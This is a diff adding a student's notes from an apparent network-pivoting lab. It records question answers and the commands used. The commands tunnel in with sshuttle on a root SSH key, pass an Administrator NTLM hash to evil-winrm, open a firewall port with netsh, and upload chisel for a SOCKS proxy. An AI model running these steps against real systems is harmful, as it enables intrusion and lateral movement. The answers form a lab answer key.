@@ -1,0 +1,21 @@
+
+									Personal PC Pivoting 
+								------------------------------------
+
+1. Whether you choose the recommended option or not, get a pivot up and running!
+ans: auto-complete
+command: sshuttle -r root@10.200.99.200 --ssh-cmd "ssh -i id_rsa" 10.200.99.0/24 -x 10.200.99.200
+command: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.99.150
+command: netsh advfirewall firewall add rule name="SujalChisel" dir=in action=allow protocol=tcp localport=19000 (in evil-winrm)
+command: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.99.150 -s /usr/share/powershell-empire/data/module_source
+         /situational_awareness/network/ (attack machine)
+command: upload chisel.exe (winrm)
+command: ./chisel.exe server -p 18000 --socks5 (in evil-winrm)
+
+2. Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language 
+   (including the version number) used on the website.
+ans: php 7.4.11
+command: chisel client 10.200.99.150:19000 9090:socks
+	 (set foxyproxy to socks5 and 127.0.0.1:9090)
+	 (then go to 10.200.99.100)
+	 (open Wappalyzer)
